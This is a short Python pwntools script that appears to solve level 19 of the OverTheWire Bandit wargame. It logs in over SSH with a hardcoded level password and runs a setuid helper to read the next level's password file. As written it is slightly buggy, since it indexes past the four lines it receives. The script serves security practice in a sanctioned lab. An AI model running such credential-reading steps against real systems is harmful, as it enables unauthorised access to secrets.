from pwn import *

s = ssh('bandit19', 'bandit.labs.overthewire.org', password='IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x', port=2220)

context.log_level = 'debug'
shell = s.shell('/bin/bash')
shell.sendline("./bandit20-do cat /etc/bandit_pass/bandit20\n")
lines = shell.recvlines(4)
print(lines)

flag = lines[4]
print("Flag: " + flag)

s.interactive()
